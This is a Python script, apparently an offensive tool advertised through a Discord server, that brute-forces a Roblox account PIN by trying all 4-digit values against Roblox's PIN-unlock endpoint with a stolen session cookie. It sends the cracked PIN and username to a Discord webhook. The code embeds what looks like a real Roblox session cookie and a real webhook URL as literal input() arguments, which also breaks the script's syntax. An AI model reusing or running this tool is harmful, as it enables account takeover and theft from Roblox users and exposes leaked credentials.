import requests
import re
import string
import time
import os

pingEveryone = True
print('')
print('Enter your cookie below:')
cookie = input(_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_ECBD60DBF88BF21137EAC96EC276E2E6AF3EBDABE48FBA89AADCA84474C5AD6002C0A96FA86C3ED0450AAF24F3C2B5C8C73D413DE18C68947A03D7E4BAEA18FB3A7141CE9020BFA9E7B4BAA4D952CBB0CEC5835BE83AFD9CE16F46A9666EA1C91B7F81B1EF05DF5F129FD6A29065E2D124C9D54C906C0F07ED401E7DCBEBA754E01DEB930AB305D8DD99AA2D8E28125DB9198CC7FA14AD283176971C44CB93C8EAD4ABB84E4E63CBE21723FD7EF9F1080F5C3C5E208A19486AF6D7BC6C0693E31F40F3A6D69210DAA65001D30C6898CE0A74A3BBD1185E6565885C03E62207F6946CE308B931C549DD8ACEA96D6A1B26CECEFDBE0828AC7C7D6A363E85C42D5779EC7083684EA8AD8D2C26714061DE6F6256D88D5BD4F0874975AEB1BD55A8DF0AC0F5B69353B5A02E2468B6E23176749AD67CE7F107874EAB630C075C3C3EF7CB301209627426694E6C9732F8E769CC8B2BCCE4B08FC34BF07120A6CEAB81EE3230E7012930086A3A3DA5842C550E7D9670A352460284AF9F266047F11CA1D2E7D49C99877D40E23D96C1F001FB20C029BF15707FCADD21E768C1C4BE717FBB24C79759EEF748507CD703AF76C837E10FE6F11389D5D9FD0B51292530DC5E8E7DB3EBB22C358D20CC6FCBE66A1D33E3F29878E49E029E1A39F4E1654F26E8AF0468B964D8297E070A8D2045CA72F3E0A248CE3B7C9EB8BED2193C2230007789FA57104B3DD4B418D07597801AC76CB3C7696B644F0FD0032B6D6743A134FB81041E08C05FA5D9E89F51BCE1CE348361D7EB9109F5C85FD5CA72094C4E38CEFF1C1F9358B8C9FBC4B2900220DBCD6E995A4D35120718578E72EA800B2F3FF821C63A4081F29AA620EC5CC1EF21176101403D2683883B384231EF5D21136EA48A14B1FBD2F9D413FEFE8C417C2DD11475063819205AEF8281BC22504DD6D8CE50874FC860DBC76D1A848959A0813E0F35DDBC583AD9AEE922CEFEB412450242DFB26C5D54FC5BC9D67D8912EA985051821054A521EE68D056570CD36027C49BCDDBADD12BB18740EC07B3D119BC1D25C90F5F4F70)
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input(https://discord.com/api/webhooks/1198870952403021894/_kJ_4lnYzjRQ-COh7vXM7sZ4xa7IxXM2zWvDmiV-w4QbXcJgAYI7U8_odEV2TM-piKTL)
os.system("cls")
print('')
print('Should we ping Everyone?: ( y / n )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
os.system("cls")

print('''Cracker Has Started.''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "kunai;",
                "avatar_url" : "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Cracked Pin!",
                    "color" : 0x00ffff,
                }
            ]

            result = requests.post(webhook, json = data)
            input('Press any key to exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error! Is the cookie valid?')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
